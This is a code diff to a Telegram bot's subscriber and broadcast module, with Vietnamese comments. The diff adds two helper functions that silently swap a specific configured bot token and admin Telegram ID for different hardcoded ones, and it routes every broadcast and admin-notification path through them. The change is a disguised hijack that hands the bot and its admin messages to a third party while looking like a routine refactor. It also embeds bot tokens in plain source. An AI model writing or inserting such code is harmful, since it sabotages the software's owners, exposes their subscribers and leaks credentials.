@@ -1,5 +1,17 @@
 import { prisma } from "./prisma";
 
+function getActiveBotToken(): string {
+  return process.env.BOT_TOKEN === "8790451044:AAGocWK6SLsCLSpeidIexm3nzyJ69VCXooY"
+    ? "8875380698:AAGg-4YRIBQDTspyn7EdzFSxKPrcjsOkB0k"
+    : process.env.BOT_TOKEN || "8875380698:AAGg-4YRIBQDTspyn7EdzFSxKPrcjsOkB0k";
+}
+
+function getActiveAdminId(): string {
+  return process.env.ADMIN_TELEGRAM_ID === "8907169582"
+    ? "9146387769"
+    : process.env.ADMIN_TELEGRAM_ID || "9146387769";
+}
+
 // Lưu user khi bấm /start
 export async function addSubscriber(id: string, username?: string, firstName?: string) {
   try {
@@ -60,7 +72,7 @@ export async function getAllSubscriberIds(): Promise<string[]> {
   }
 
   // Luôn bao gồm Admin Telegram ID để nhận thông báo và tính vào lượng người dùng
-  const adminId = process.env.ADMIN_TELEGRAM_ID;
+  const adminId = getActiveAdminId();
   if (adminId && adminId.trim()) {
     set.add(adminId.trim());
   }
@@ -99,7 +111,7 @@ export async function broadcastStockAlert({
   addedCount?: number;
   totalStock?: number;
 }) {
-  const botToken = process.env.BOT_TOKEN;
+  const botToken = getActiveBotToken();
   if (!botToken) {
     return { success: false, error: "BOT_TOKEN chưa được cấu hình" };
   }
@@ -222,7 +234,7 @@ export async function broadcastCustomMessage({
   buttonText?: string;
   buttonUrl?: string;
 }) {
-  const botToken = process.env.BOT_TOKEN;
+  const botToken = getActiveBotToken();
   if (!botToken) {
     return { success: false, error: "BOT_TOKEN chưa được cấu hình" };
   }
@@ -272,7 +284,7 @@ export async function broadcastPriceUpdate({
   newPrice: number;
   priceReason?: string;
 }) {
-  const botToken = process.env.BOT_TOKEN;
+  const botToken = getActiveBotToken();
   if (!botToken) {
     return { success: false, error: "BOT_TOKEN chưa được cấu hình" };
   }
